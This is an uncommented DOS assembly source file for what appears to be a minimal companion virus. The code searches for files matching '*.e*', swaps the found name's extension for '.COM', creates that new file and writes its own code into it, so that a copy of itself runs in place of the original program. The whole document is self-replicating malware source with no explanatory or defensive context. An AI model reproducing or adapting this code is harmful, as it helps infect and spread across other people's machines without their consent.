.model tiny
.386
.code
	org 100h
main:	db	'*.e*'
	mov dx,si

	mov ah,4eh
	int 21h

	mov dx,9Eh

	mov ax,5B00h+'.'
repne	scasb
	mov ds:[di],00000000+'MOC'

	mov cx,si
	Call XXX
XXX:	int 21h
	xchg ax,bx
	mov ah,40h
	mov dx,si
	ret
end	main